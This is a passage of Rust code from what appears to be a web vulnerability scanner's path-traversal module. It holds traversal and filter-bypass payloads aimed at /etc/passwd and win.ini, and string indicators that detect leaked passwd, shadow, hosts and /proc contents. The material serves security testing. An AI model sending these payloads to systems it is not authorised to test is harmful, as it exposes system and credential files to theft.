    /// Basic tier
    fn generate_basic_payloads(&self) -> Vec<TraversalPayload> {
        vec![
            TraversalPayload {
                payload: "../../../etc/passwd".to_string(),
                category: TraversalBypassCategory::StandardTraversal,
                target_file: "etc/passwd".to_string(),
            },
            TraversalPayload {
                payload: "..\\..\\..\\windows\\win.ini".to_string(),
                category: TraversalBypassCategory::WindowsSpecific,
                target_file: "windows/win.ini".to_string(),
            },
            TraversalPayload {
                payload: "....//....//....//etc/passwd".to_string(),
                category: TraversalBypassCategory::FilterBypass,
                target_file: "etc/passwd".to_string(),
            },
        ]
    }

    fn detect_path_traversal(
        &self,
        body: &str,
        payload: &TraversalPayload,
        parameter: &str,
        test_url: &str,
    ) -> Option<Vulnerability> {
        Self::detect_path_traversal_static(body, payload, parameter, test_url)
    }

    /// Static version for use in async contexts without &self
    fn detect_path_traversal_static(
        body: &str,
        payload: &TraversalPayload,
        parameter: &str,
        test_url: &str,
    ) -> Option<Vulnerability> {
        let body_lower = body.to_lowercase();

        // Linux indicators
        let linux_indicators = [
            ("root:x:", "/etc/passwd"),
            ("root:$", "/etc/shadow"),
            ("daemon:x:", "/etc/passwd"),
            ("bin:x:", "/etc/passwd"),
            ("nobody:x:", "/etc/passwd"),
            ("/bin/bash", "shell"),
            ("/bin/sh", "shell"),
            ("www-data:", "passwd"),
            ("nameserver", "resolv.conf"),
        ];

        // Windows indicators - enhanced detection
        // NOTE: Removed generic strings like "127.0.0.1", "::1", "localhost" which appear on many normal pages
        // Hosts file detection is handled separately with proper format validation below
        let windows_indicators = [
            ("[extensions]", "win.ini"),
            ("[fonts]", "win.ini"),
            ("[mci extensions]", "win.ini"),
            ("for 16-bit app support", "win.ini"),
            ("[boot loader]", "boot.ini"),
            ("[drivers]", "system.ini"),
        ];

        // Process indicators
        let proc_indicators = [
            ("uid=", "environ/id"),
            ("path=", "environ"),
            ("home=", "environ"),
            ("linux version", "proc/version"),
        ];

        // Config file indicators - must be specific to avoid matching documentation
        // These should only match if we're actually reading PHP source code / config files
        let config_indicators: [(&str, &str); 0] = [
            // Removed these as they cause too many false positives:
            // - "<?php" appears in docs/tutorials
            // - "define(" is too generic
            // - "database" and "connectionstring" appear everywhere
            // PHP filter detection will catch base64-encoded source code
        ];

        // Check for specific file patterns based on target
        let target_lower = payload.target_file.to_lowercase();

        // Enhanced hosts file detection - must be VERY strict to avoid false positives
        // Static websites often contain "localhost", "127.0.0.1", or "::1" in normal content
        if target_lower.contains("hosts") && !target_lower.contains("hostname") {
            // Look for ACTUAL hosts file format lines:
            // - Must have IP address (valid IPv4 or IPv6) followed by whitespace and hostname(s)
            // - Must see multiple such lines OR the exact standard format
            let lines: Vec<&str> = body.lines().collect();
            let mut hosts_format_lines = 0;
            let mut evidence_line: Option<String> = None;

            for line in &lines {
                let trimmed = line.trim();

                // Skip empty lines and comments
                if trimmed.is_empty() || trimmed.starts_with('#') {
                    continue;
                }

                // Skip HTML/JS content - hosts file is plain text
                if trimmed.contains('<')
                    || trimmed.contains('>')
                    || trimmed.contains('{')
                    || trimmed.contains('}')
                    || trimmed.contains('(')
                    || trimmed.contains(')')
                    || trimmed.contains(';')
                    || trimmed.contains(',')
                {
                    continue;
                }

                let parts: Vec<&str> = trimmed.split_whitespace().collect();
                if parts.len() >= 2 {
                    let potential_ip = parts[0];
                    let potential_hostname = parts[1];

                    // Validate as proper IPv4 (X.X.X.X format)
                    let is_ipv4 = potential_ip
                        .split('.')
                        .filter_map(|p| p.parse::<u8>().ok())
                        .count()
                        == 4;

                    // Validate as proper IPv6 (contains : and looks like IPv6)
                    let is_ipv6 = potential_ip.contains(':')
                        && potential_ip
                            .chars()
                            .all(|c| c.is_ascii_hexdigit() || c == ':')
                        && potential_ip.len() >= 2;

                    // Hostname must look like a hostname (alphanumeric, dots, hyphens only)
                    let valid_hostname = potential_hostname
                        .chars()
                        .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')
                        && potential_hostname.len() >= 1;

                    if (is_ipv4 || is_ipv6) && valid_hostname {
                        hosts_format_lines += 1;
                        if evidence_line.is_none() {
                            evidence_line = Some(trimmed.to_string());
                        }
                    }
                }
            }

            // Only flag if we found MULTIPLE hosts file format lines
            // A single "127.0.0.1 localhost" could be coincidental
            if hosts_format_lines >= 2 {
                return Some(Self::create_vulnerability_static(
                    parameter,
                    &payload.payload,
                    test_url,
                    &format!("Hosts file content found via {}", payload.category.as_str()),
                    Confidence::High,
                    format!(
                        "Found {} hosts file format lines. Example: {}",
                        hosts_format_lines,
                        evidence_line.unwrap_or_default()
                    ),
                    &payload.category,
                ));
            }
        }

        for (indicator, file_type) in &linux_indicators {
            if body_lower.contains(indicator) {
                return Some(Self::create_vulnerability_static(
                    parameter,
                    &payload.payload,
                    test_url,
                    &format!(
                        "{} content found via {}",
                        file_type,
                        payload.category.as_str()
                    ),
                    Confidence::High,
                    format!("Indicator: {}", indicator),
                    &payload.category,
                ));
            }
        }

        for (indicator, file_type) in &windows_indicators {
            if body_lower.contains(indicator) {
                return Some(Self::create_vulnerability_static(
                    parameter,
                    &payload.payload,
                    test_url,
                    &format!(
                        "{} content found via {}",
                        file_type,
                        payload.category.as_str()
                    ),
                    Confidence::High,
                    format!("Indicator: {}", indicator),
                    &payload.category,
                ));
            }
        }

        for (indicator, file_type) in &proc_indicators {
            if body_lower.contains(indicator) {
                return Some(Self::create_vulnerability_static(
                    parameter,
                    &payload.payload,
                    test_url,
                    &format!(
                        "{} content found via {}",
                        file_type,
                        payload.category.as_str()
                    ),
                    Confidence::High,
                    format!("Indicator: {}", indicator),
                    &payload.category,
                ));
            }
        }

        for (indicator, file_type) in &config_indicators {
            if body_lower.contains(indicator) {
                return Some(Self::create_vulnerability_static(
                    parameter,
                    &payload.payload,
                    test_url,
                    &format!(
                        "{} content found via {}",
                        file_type,
                        payload.category.as_str()
                    ),
                    Confidence::High,
                    format!("Indicator: {}", indicator),
                    &payload.category,
                ));
            }
        }

        None
    }

    fn create_vulnerability(
        &self,
        parameter: &str,
        payload: &str,
        test_url: &str,
        description: &str,
        confidence: Confidence,
        evidence: String,
        category: &TraversalBypassCategory,
    ) -> Vulnerability {
        Self::create_vulnerability_static(
            parameter,
            payload,
            test_url,
            description,
            confidence,
            evidence,
            category,
        )
    }

    fn create_vulnerability_static(
        parameter: &str,
        payload: &str,
        test_url: &str,
        description: &str,
        confidence: Confidence,
        evidence: String,
        category: &TraversalBypassCategory,
    ) -> Vulnerability {
        Vulnerability {
            id: format!("lfi_{:x}", rand::random::<u32>()),
            vuln_type: format!("Path Traversal ({})", category.as_str()),
            severity: Severity::High,
            confidence,
            category: "Path Traversal".to_string(),
            url: test_url.to_string(),
            parameter: Some(parameter.to_string()),
            payload: payload.to_string(),
            description: format!("LFI/Path Traversal in '{}': {}. Bypass: {}", parameter, description, category.as_str()),
            evidence: Some(evidence),
            cwe: "CWE-22".to_string(),
            cvss: 7.5,
            verified: true,
            false_positive: false,
            remediation: "Validate file paths, use allowlists, canonicalize paths, block traversal sequences.".to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_confidence: None,
                ml_data: None,
        }
    }
}
